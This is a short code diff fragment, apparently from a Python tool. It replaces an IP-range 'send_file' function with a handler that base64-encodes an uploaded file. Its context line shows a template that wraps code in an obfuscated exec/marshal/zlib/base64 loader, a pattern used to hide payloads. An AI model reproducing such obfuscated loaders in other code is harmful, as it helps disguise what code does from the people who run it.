@@ -188,8 +188,17 @@ exec(marshal.loads(zlib.decompress(base64.b64decode({repr(base64.b64encode(zlib.
     
 
 
-    def send_file(data):
-        ip_range = data['ip']
-        ip_addresses = self.parce_ip(ip_range)
+    def upload_file(data):
+        file = data.files['file']
+    
+        if file.filename == '':
+            return jsonify({'error': 'No selected file'}), 400
+        
+        if file:
+            # Read the file and convert to base64
+            file_content = file.read()
+            base64_encoded = base64.b64encode(file_content).decode('utf-8')
+            
+            print(base64_encoded)
 
 
